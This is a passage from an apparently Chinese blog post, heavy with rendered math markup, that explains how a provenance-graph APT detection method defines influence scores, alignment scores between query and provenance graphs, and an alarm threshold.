style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span></span></span></span>之间（<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">G_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>中）的influence score定义为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi mathvariant="normal">Γ</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\Gamma_{i, j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord">Γ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>：</p><p><img src="https://img-blog.csdnimg.cn/20200325201702957.png#pic_center" alt="" /></p><p>其中，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>C</mi><mi>min</mi><mo>⁡</mo></msub><mo stretchy="false">(</mo><mi>i</mi><mo>−</mo><mo>→</mo><mi>j</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">C_{\min }(i-\rightarrow j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31750199999999995em;"><span style="top:-2.317502em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.467502em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop mtight">min</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">)</span></span></span></span>表示攻击者想要生成flow<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi><mo>−</mo><mo>→</mo><mi>j</mi></mrow><annotation encoding="application/x-tex">i-\rightarrow j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.74285em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">i</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span></span></span></span>所需要的最少攻击数目，这些攻击步骤互不相同且独立。这个值捕获了攻击者控制整个flow的程度，并且<strong>根据出现在flow中进程的共同祖先的最小值</strong>来计算。举个例子，如果一个flow中的所有进程都来自同一祖先，那么<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>C</mi><mi>min</mi><mo>⁡</mo></msub><mo stretchy="false">(</mo><mi>i</mi><mo>−</mo><mo>→</mo><mi>j</mi><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">C_{\min }(i-\rightarrow j)=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31750199999999995em;"><span style="top:-2.317502em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.467502em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop mtight">min</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>.</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>C</mi><mrow><mi>t</mi><mi>h</mi><mi>r</mi></mrow></msub></mrow><annotation encoding="application/x-tex">C_{thr}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="mord mathdefault mtight">h</span><span class="mord mathdefault mtight" style="margin-right:0.02778em;">r</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>表示<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>C</mi><mi>min</mi><mo>⁡</mo></msub><mo stretchy="false">(</mo><mi>i</mi><mo>−</mo><mo>→</mo><mi>j</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">C_{\min }(i-\rightarrow j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31750199999999995em;"><span style="top:-2.317502em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.467502em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop mtight">min</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">)</span></span></span></span>的最大值，因为在实际的APT活动中，攻击入口点一般只有一个或者少数几个。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>C</mi><mi>min</mi><mo>⁡</mo></msub><mo stretchy="false">(</mo><mi>i</mi><mo>−</mo><mo>→</mo><mi>j</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">C_{\min }(i-\rightarrow j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31750199999999995em;"><span style="top:-2.317502em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.467502em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop mtight">min</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">)</span></span></span></span>描述了攻击者要控制特定路径的困难程度；influence score描述了攻击者想要控制特定路径的容易程度。且当<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi><mo>−</mo><mo>→</mo><mi>j</mi></mrow><annotation encoding="application/x-tex">i-\rightarrow j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.74285em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">i</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span></span></span></span>没有flow时，influence score为0。</p><h3 id="512-alignment-score图之间"><a class="markdownIt-Anchor" href="#512-alignment-score图之间"></a> 5.1.2 Alignment Score（图之间）</h3><p>该分数基于influence score的概念，为graph alignment <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>q</mi></msub><mo>:</mo><mo>:</mo><mi>G</mi><mi>p</mi></mrow><annotation encoding="application/x-tex">G_q::Gp</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">G</span><span class="mord mathdefault">p</span></span></span></span>设计：</p><p><img src="https://img-blog.csdnimg.cn/20200325201724354.png#pic_center" alt="" /></p><p>其中，节点<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi><mi mathvariant="normal">、</mi><mi>j</mi></mrow><annotation encoding="application/x-tex">i、j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">i</span><span class="mord cjk_fallback">、</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span></span></span></span>属于<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>V</mi><mo stretchy="false">(</mo><msub><mi>G</mi><mi>q</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">V(G_q)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，节点<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>k</mi><mi mathvariant="normal">、</mi><mi>l</mi></mrow><annotation encoding="application/x-tex">k、l</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord cjk_fallback">、</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span></span></span></span>属于<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>V</mi><mo stretchy="false">(</mo><msub><mi>G</mi><mi>p</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">V(G_p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，flow <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi><mo>−</mo><mo>→</mo><mi>j</mi></mrow><annotation encoding="application/x-tex">i-\rightarrow j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.74285em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">i</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span></span></span></span> 在<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">G_q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>上定义。</p><p>首先，对于<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">G_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>中那些 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span> 相似、<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>l</mi></mrow><annotation encoding="application/x-tex">l</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span></span></span></span> 相似的节点对<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>k</mi><mo separator="true">,</mo><mi>l</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(k,l)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mclose">)</span></span></span></span>，对其influence score进行求和；然后进行归一化，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∣</mi><mi>F</mi><mo stretchy="false">(</mo><msub><mi>G</mi><mi>q</mi></msub><mo stretchy="false">)</mo><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">|F(G_{q})|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord">∣</span></span></span></span>表示<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">G_q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>中的flow数量，即influence score之和的最大值。</p><p>可以看出，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi><mo stretchy="false">(</mo><msub><mi>G</mi><mi>q</mi></msub><mo>:</mo><mo>:</mo><msub><mi>G</mi><mi>p</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">S(G_q::G_p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>越大，node alignments的值越大，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">G_q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">G_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>之间的flow的相似度越大，遭受攻击的可能性也越大。其中，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi><mo stretchy="false">(</mo><msub><mi>G</mi><mi>q</mi></msub><mo>:</mo><mo>:</mo><msub><mi>G</mi><mi>p</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">S(G_q::G_p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>的值在0到1之间。</p><p>最后，当<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi><mo stretchy="false">(</mo><msub><mi>G</mi><mi>q</mi></msub><mo>:</mo><mo>:</mo><msub><mi>G</mi><mi>p</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">S(G_q::G_p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>超过阈值之后，就引起报警。那么如何确定最合适的阈值呢？回想之前我们定义的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>C</mi><mrow><mi>t</mi><mi>h</mi><mi>r</mi></mrow></msub></mrow><annotation encoding="application/x-tex">C_{thr}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="mord mathdefault mtight">h</span><span class="mord mathdefault mtight" style="margin-right:0.02778em;">r</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>表示我们假设的攻击者想要exploit的入口点进程数的最大值，因此influence score的值为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mn>1</mn><msub><mi>C</mi><mrow><mi>t</mi><mi>h</mi><mi>r</mi></mrow></msub></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{C_{t h r}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" 